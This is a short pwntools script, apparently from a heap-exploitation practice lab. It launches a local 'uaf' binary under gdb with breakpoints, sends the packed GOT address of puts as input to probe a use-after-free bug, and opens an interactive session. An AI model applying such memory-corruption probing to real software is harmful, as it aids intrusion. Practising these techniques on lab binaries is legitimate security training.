# -*- coding: utf-8 -*-

from pwn import *
context(log_level = 'debug', os = 'linux')

filename = 'heap_uaf/uaf'

p = process(filename)
elf = ELF(filename)

gdbscript = '''
directory heap_uaf
b uaf.c:23
b uaf.c:35
'''

gdb.attach(p, gdbscript = gdbscript)
p.sendlineafter('input sth\n', p64(elf.got['puts']))
p.interactive()